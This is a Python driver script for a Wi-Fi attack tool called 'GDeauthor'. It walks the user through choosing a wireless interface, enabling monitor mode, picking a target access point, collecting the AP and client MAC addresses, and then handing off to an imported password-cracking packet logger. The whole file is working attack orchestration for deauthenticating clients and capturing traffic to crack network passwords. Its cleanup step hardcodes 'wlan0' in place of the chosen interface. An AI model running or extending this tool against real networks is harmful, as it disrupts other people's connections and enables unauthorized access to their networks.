from listInterfaces import listInterfaces
from CheckMonitorMode import checkMonitor
from CheckPacketInjection import checkPacketInjection
from ActivateMonitorMode import activateMonitorMode
from listAccessPoints import listAccessPoints
from DeactivateMonitorMode import deactivateMonitorModeAir
from DeactivateMonitorMode import deactivateMonitorModeMain
from GetMACAddresses import getMACAddresses
from CrackPassword import logPackets
def main():

                                                                                                                                   
    print("      _____         _____        ______          ____    ____   ____  _________________  ____   ____         _____         _____   ")
    print("  ___|\    \    ___|\    \   ___|\     \    ____|\   \  |    | |    |/                 \|    | |    |   ____|\    \    ___|\    \  ")
    print(" /    /\    \  |    |\    \ |     \     \  /    /\    \ |    | |    |\______     ______/|    | |    |  /     /\    \  |    |\    \ ")
    print("|    |  |____| |    | |    ||     ,_____/||    |  |    ||    | |    |   \( /    /  )/   |    |_|    | /     /  \    \ |    | |    |")
    print("|    |    ____ |    | |    ||     \--'\_|/|    |__|    ||    | |    |    ' |   |   '    |    .-.    ||     |    |    ||    |/____/ ")
    print("|    |   |    ||    | |    ||     /___/|  |    .--.    ||    | |    |      |   |        |    | |    ||     |    |    ||    |\    \ ")
    print("|    |   |_,  ||    | |    ||     \____|\ |    |  |    ||    | |    |     /   //        |    | |    ||\     \  /    /||    | |    |")
    print("|\ ___\___/  /||____|/____/||____ '     /||____|  |____||\___\_|____|    /___//         |____| |____|| \_____\/____/ ||____| |____|")
    print("| |   /____ / ||    /    | ||    /_____/ ||    |  |    || |    |    |   |`   |          |    | |    | \ |    ||    | /|    | |    |")
    print(" \|___|    | / |____|____|/ |____|     | /|____|  |____| \|____|____|   |____|          |____| |____|  \|____||____|/ |____| |____|")
    print("   \( |____|/    \(    )/     \( |_____|/   \(      )/      \(   )/       \(              \(     )/       \(    )/      \(     )/  ")
    print("    '   )/        '    '       '    )/       '      '        '   '         '               '     '         '    '        '     '   ")
    print("        '                           '                                                                                              ")

    print("Welcome to GDeauthor! Select a Network Interface that supports Monitor Mode and Packet Injection. Here are the list of available interfaces:")
    interfaces = listInterfaces()
    for key in interfaces:
        print(str(key)+">" +interfaces[key])
    interfaceNum = int(input("[+]Enter Interface Num:"))
    if interfaceNum not in list(interfaces.keys()):
        print("[-]Choose a proper Interface")
        exit()
    else:
        interface = interfaces[interfaceNum]
    if(not checkMonitor(interface)):
       print("[-]Interface does not support monitor mode.")
       exit()
    if(checkMonitor(interface)==-1):
        deactivateMonitorModeAir(interface)
    packetInjectionResult = checkPacketInjection(interface)
    deactivateMonitorModeMain(interface)
    if(not packetInjectionResult):
        print("Interface does not support packet injection")
        exit()

    print("[+]Activating Monitor Mode...\n\nHowever, before we do that")
    APlist = listAccessPoints()
    print("[+]Choose your target:")
    for AP in APlist:
        print(AP)
    targetAP = input("[+]Target,please:")
    if targetAP not in APlist:
        print("Choose a proper target please!")
        deactivateMonitorModeAir(interface)
        exit()
    print("[+]Target Selected")
    print("Also,")
    activateMonitorMode(interface)
    print("[+]Monitor Mode Activated!Yay")
    print("[+]Getting required information to carry out attack...")
    MACs = getMACAddresses(targetAP)
    if MACs["Client MAC"] == 0:
        print("No clients are connected to the AP. Cannot perform Deauthentication")
        deactivateMonitorModeAir(interface)
        exit()
    print("MAC Address of AP: ",MACs["AP MAC"])
    print("MAC Address of Client: ",MACs["Client MAC"])
    print("Channel for AP: ",MACs["AP Channel"])
    logPackets(MACs["AP Channel"],MACs["AP MAC"],MACs["Client MAC"])
    deactivateMonitorModeAir("wlan0")
main()

